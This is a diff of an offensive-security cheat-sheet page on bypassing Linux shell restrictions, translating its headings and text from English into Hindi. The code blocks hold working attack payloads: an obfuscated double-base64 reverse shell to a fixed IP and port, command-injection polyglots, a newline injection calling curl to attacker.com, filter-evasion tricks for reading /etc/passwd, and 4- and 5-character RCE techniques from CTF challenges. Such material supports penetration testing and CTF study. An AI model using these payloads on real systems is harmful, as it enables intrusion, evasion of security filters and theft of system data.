@@ -1,27 +1,16 @@
-# Bypass Linux Restrictions
+# Linux प्रतिबंधों को बायपास करें
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
+## सामान्य सीमाओं के बायपास
 
-\
-Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=bypass-bash-restrictions) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=bypass-bash-restrictions" %}
-
-## Common Limitations Bypasses
-
-### Reverse Shell
-
+### रिवर्स शेल
 ```bash
 # Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
-
-### Short Rev shell
-
+### शॉर्ट रेव शेल
 ```bash
 #Trick from Dikline
 #Get a rev shell with
@@ -29,9 +18,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-
-### Bypass Paths and forbidden words
-
+### बायपास पथ और निषिद्ध शब्द
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -91,9 +78,7 @@ mi # This will throw an error
 whoa # This will throw an error
 !-1!-2 # This will execute whoami
 ```
-
-### Bypass forbidden spaces
-
+### प्रतिबंधित स्थानों को बायपास करें
 ```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
@@ -120,22 +105,16 @@ echo "ls\x09-l" | bash
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-
-### Bypass backslash and slash
-
+### बैकस्लैश और स्लैश को बायपास करें
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-
-### Bypass pipes
-
+### पाइप्स को बायपास करें
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-
-### Bypass with hex encoding
-
+### हेक्स एन्कोडिंग के साथ बायपास
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -145,36 +124,28 @@ cat `xxd -r -p <<< 2f6574632f706173737764`
 xxd -r -ps <(echo 2f6574632f706173737764)
 cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```
-
-### Bypass IPs
-
+### आईपी बायपास
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
 ```
-
-### Time based data exfiltration
-
+### समय आधारित डेटा निकासी
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
-
-### Getting chars from Env Variables
-
+### Env Variables से कैरेक्टर्स प्राप्त करना
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
+### DNS डेटा एक्सफिल्ट्रेशन
 
-### DNS data exfiltration
+आप उदाहरण के लिए **burpcollab** या [**pingb**](http://pingb.in) का उपयोग कर सकते हैं।
 
-You could use **burpcollab** or [**pingb**](http://pingb.in) for example.
+### बिल्टइन्स
 
-### Builtins
-
-In case you cannot execute external functions and only have access to a **limited set of builtins to obtain RCE**, there are some handy tricks to do it. Usually you **won't be able to use all** of the **builtins**, so you should **know all your options** to try to bypass the jail. Idea from [**devploit**](https://twitter.com/devploit).\
-First of all check all the [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Then here you have some **recommendations**:
-
+यदि आप बाहरी फ़ंक्शंस को निष्पादित नहीं कर सकते हैं और केवल **RCE प्राप्त करने के लिए सीमित सेट के बिल्टइन्स** तक पहुंच है, तो इसे करने के लिए कुछ उपयोगी तरकीबें हैं। आमतौर पर आप **सभी** **बिल्टइन्स** का उपयोग नहीं कर पाएंगे, इसलिए आपको **जेल को बायपास करने के लिए सभी विकल्पों** के बारे में **जानना चाहिए**। [**devploit**](https://twitter.com/devploit) से विचार।\
+सबसे पहले सभी [**शेल बिल्टइन्स**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)** की जांच करें।** फिर यहां आपके लिए कुछ **सिफारिशें** हैं:
 ```bash
 # Get list of builtins
 declare builtins
@@ -226,30 +197,22 @@ chmod +x [
 export PATH=/tmp:$PATH
 if [ "a" ]; then echo 1; fi # Will print hello!
 ```
-
-### Polyglot command injection
-
+### पॉलीग्लॉट कमांड इंजेक्शन
 ```bash
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-
-### Bypass potential regexes
-
+### संभावित regexes को बायपास करें
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
 ```
-
 ### Bashfuscator
-
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
 ```
-
-### RCE with 5 chars
-
+### 5 अक्षरों के साथ RCE
 ```bash
 # From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
 #Oragnge Tsai solution
@@ -296,9 +259,7 @@ ln /f*
 ## If there is a file /flag.txt that will create a hard link
 ## to it in the current folder
 ```
-
-### RCE with 4 chars
-
+### 4 अक्षरों के साथ RCE
 ```bash
 # In a similar fashion to the previous bypass this one just need 4 chars to execute commands
 # it will follow the same principle of creating the command `ls -t>g` in a file
@@ -333,34 +294,25 @@ ln /f*
 'sh x'
 'sh g'
 ```
+## केवल-पढ़ने/नोएक्सेक/डिस्ट्रोलैस बायपास
 
-## Read-Only/Noexec/Distroless Bypass
-
-If you are inside a filesystem with the **read-only and noexec protections** or even in a distroless container, there are still ways to **execute arbitrary binaries, even a shell!:**
+यदि आप एक फ़ाइल सिस्टम के अंदर हैं जिसमें **केवल-पढ़ने और नोएक्सेक सुरक्षा** हैं या यहां तक कि एक डिस्ट्रोलैस कंटेनर में हैं, तो भी **मनमाने बाइनरी को निष्पादित करने के तरीके हैं, यहां तक कि एक शेल!:**
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-## Chroot & other Jails Bypass
+## चूट और अन्य जेल बायपास
 
 {{#ref}}
 ../privilege-escalation/escaping-from-limited-bash.md
 {{#endref}}
 
-## References & More
+## संदर्भ और अधिक
 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 - [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)
-
-<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-\
-Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=bypass-bash-restrictions) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=bypass-bash-restrictions" %}
+- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
 
 {{#include ../../banners/hacktricks-training.md}}
